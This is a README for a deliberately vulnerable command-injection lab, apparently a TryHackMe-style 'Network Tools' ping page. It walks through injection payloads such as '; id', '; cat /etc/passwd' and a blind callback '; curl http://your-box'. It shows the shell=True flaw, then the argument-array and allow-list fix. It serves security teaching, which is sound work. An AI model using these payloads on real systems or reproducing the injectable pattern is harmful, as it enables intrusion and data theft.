# Command Injection Lab — "Network Tools" Ping Page

A TryHackMe-style vulnerable web app: a little **ping tool** that you can turn into a
**remote shell** through command injection — then flip to `secure` mode and watch the
exact same payloads do nothing. This is the demo from the InfoSec Mastery video.

> ⚠️ **Educational / awareness use only.** This app is deliberately vulnerable. Run it
> **only on your own machine**, in this isolated lab. The classic teaching payloads
> (`; id`, `; cat /etc/passwd`) only ever touch the throwaway container.

---

## What's inside

| File | Purpose |
|------|---------|
| `app.py` | the ping page — `MODE=vuln` builds a shell string from your input (injectable); `MODE=secure` passes it as a separate argument + allow-list (safe) |
| `Dockerfile`, `docker-compose.yml` | build & run the app on <http://localhost:8081> |

---

## Run it

```bash
cd lab
docker compose up --build          # vulnerable mode, http://localhost:8081
```

Open <http://localhost:8081>.

---

## 1) Use it normally

In the box, enter `127.0.0.1` and hit **Ping** — you get a normal ping reply. The app is
running, under the hood, roughly:

```python
subprocess.run(f"ping -c 1 {host}", shell=True)   # host comes straight from you
```

## 2) Inject a command

Now, instead of just a host, enter:

```
127.0.0.1; id
```

You get the ping reply **and**, right underneath it, the output of `id` — e.g.
`uid=0(root) ...`. That line didn't come from `ping`; it came from **your** command,
because the shell saw `ping -c 1 127.0.0.1; id` and ran *both* commands.

Escalate with the classic:

```
127.0.0.1; cat /etc/passwd
```

…and the server prints its account list straight onto the page. From one input box, you
now have arbitrary command execution.

> From the command line instead of the browser:
> ```bash
> curl -G "http://localhost:8081/ping" --data-urlencode "host=127.0.0.1; id"
> ```

### Blind variant
Even with no output on the page, injection can be confirmed by **timing** or **callbacks**:
`127.0.0.1; sleep 5` (does the page hang?) or `127.0.0.1; curl http://your-box` (does the
server phone home?). No visible output does **not** mean safe.

---

## 3) See the fix — same payloads, nothing happens

Stop the app and bring it back in **secure** mode:

```bash
MODE=secure docker compose up --build
```

Try `127.0.0.1; id` again. Now you get:

```
Rejected: '127.0.0.1; id' is not a valid host.
Allowed: letters, digits, dot, dash.
```

Two things changed, and either one alone stops the attack:

```python
# 1) INPUT IS DATA, NOT A COMMAND — call the binary directly, pass args as a list.
subprocess.run(["ping", "-c", "1", host])   # no shell; ';' is just a character
# 2) ALLOW-LIST validation before it goes anywhere near the system.
if not re.match(r"^[A-Za-z0-9.\-]+$", host): reject()
```

With the argument-array form, even if validation were removed, `; id` would be handed to
`ping` as a single weird *hostname* (which simply fails) — it can never become a second
command, because **there is no shell to interpret it.**

---

## How to fix it (for real systems)

| Fix | Why it works |
|---|---|
| **Don't build shell strings from input** | pass arguments as an array (`execFile`/`subprocess.run([...])`, no `shell=True`) so input stays *data* |
| **Allow-list validation** | accept only the characters a real value needs (`^[A-Za-z0-9.-]+$` for a host) |
| **Least privilege** | run the service as a low-priv user so a mistake does limited damage |
| **WAF** | can catch obvious payloads — treat it as defense-in-depth, **not** the fix |

The real fix is always at the source: **keep user input and commands completely separate.**

---

## Reset

```bash
docker compose down
```

### How this maps to the video
Normal ping → inject `; id` (first RCE) → escalate with `; cat /etc/passwd` → realize the
flaw was gluing input into a shell command, not `ping` itself → fix it at the source with
an argument array + allow-list.
